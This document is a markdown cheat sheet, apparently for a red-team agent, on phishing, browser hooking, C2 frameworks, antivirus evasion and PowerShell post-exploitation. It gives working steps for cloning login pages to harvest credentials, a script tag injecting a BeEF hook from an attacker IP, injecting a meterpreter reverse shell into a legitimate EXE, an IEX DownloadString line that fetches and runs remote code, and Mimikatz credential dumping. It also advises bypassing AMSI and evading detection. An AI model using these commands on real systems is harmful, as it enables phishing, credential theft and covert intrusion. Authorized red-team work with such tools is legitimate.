# Social Engineering & C2 Frameworks

> Covers: setoolkit, beef, empire, cobaltstrike, veil, shellter, powersploit

## Risk Level: HIGH — These tools simulate real adversary operations

---

## setoolkit — Social Engineering Toolkit

### When to Use
| Signal | Action |
|---|---|
| Phishing engagement authorized | Credential harvester |
| Need cloned login page | Website clone attack |
| Client-side attack needed | Payload delivery |

### Common Attacks
```
# Launch
setoolkit

# Menu navigation:
1) Social-Engineering Attacks
  2) Website Attack Vectors
    3) Credential Harvester Attack Method
      2) Site Cloner
        → Enter URL to clone
        → Captures submitted credentials
```

### Key Attacks
| Attack | Purpose |
|---|---|
| Credential Harvester | Clone login page, capture creds |
| Tabnabbing | Replace inactive tab with phishing |
| HTA Attack | Serve HTA payload via browser |
| PowerShell Attack | Encoded PS reverse shell |

---

## BeEF — Browser Exploitation Framework

### When to Use
| Signal | Action |
|---|---|
| XSS found | Hook browsers via XSS |
| Need browser control | Keylogging, screenshots, redirect |
| Client-side exploitation | Browser-based attacks |

### Setup
```bash
# Start BeEF
beef-xss

# Hook URL (inject via XSS):
<script src="http://<your_ip>:3000/hook.js"></script>

# Access panel: http://localhost:3000/ui/panel
# Default creds: beef:beef
```

---

## C2 Frameworks Overview

### Empire — PowerShell/Python C2
```
Best for: Windows post-exploitation, PowerShell-heavy environments
Listeners → Stagers → Agents → Modules
```

### Cobalt Strike — Commercial C2
```
Best for: Full red team operations, team collaboration
Beacon → diverse comms (HTTP, DNS, SMB)
Malleable C2 profiles for evasion
```

### When to Use C2
| Signal | Action |
|---|---|
| Need persistent access | Deploy C2 agent |
| Multi-host management | C2 centralizes sessions |
| Need covert comms | C2 protocols (DNS, HTTPS) |
| Team operation | Multiple operators |

---

## Payload Evasion Tools

### veil — AV Evasion Framework
```bash
# Launch
veil

# Generate payload
use Evasion
list                    # show available payloads
use <payload_number>
generate
```

### shellter — PE Injection
```bash
# Inject payload into legitimate EXE
shellter
# Choose: A (automatic)
# Target PE: legitimate.exe
# Payload: meterpreter reverse TCP
```

### When Evasion is Needed
```
STANDARD PAYLOAD CAUGHT BY AV?
  ├─ Try different encoder (msfvenom -e)
  ├─ Try veil framework
  ├─ Try shellter (inject into legit PE)
  ├─ Custom payload (manual coding)
  └─ Fileless attack (PowerShell, in-memory)
```

---

## PowerSploit — PowerShell Post-Exploitation

### Key Modules
| Module | Purpose |
|---|---|
| Invoke-Mimikatz | Mimikatz via PowerShell |
| PowerView | AD enumeration |
| Invoke-Shellcode | In-memory shellcode execution |
| Get-GPPPassword | Group Policy preference passwords |
| Find-LocalAdminAccess | Find hosts where user is admin |

### Common Usage
```powershell
# Import (on target)
IEX(New-Object Net.WebClient).DownloadString('http://<ip>/PowerView.ps1')

# AD enumeration
Get-DomainUser
Get-DomainGroup -Identity "Domain Admins"
Find-LocalAdminAccess

# Credential access
Invoke-Mimikatz -DumpCreds
Get-GPPPassword
```

---

## Junior Mistakes

- Deploying C2 without understanding network detection
- Using default Cobalt Strike/Empire profiles (instantly detected)
- Hosting phishing page on non-HTTPS (browser warnings)
- Not testing payload against target AV first
- Running PowerSploit without AMSI bypass (gets blocked)

## Decision: Which Approach?

```
NEED CREDENTIALS?     → SET credential harvester
NEED BROWSER CONTROL? → BeEF via XSS
NEED PERSISTENT C2?   → Empire (free) or Cobalt Strike (commercial)
NEED AV BYPASS?       → veil → shellter → custom
NEED PS POST-EXPLOIT? → PowerSploit
```
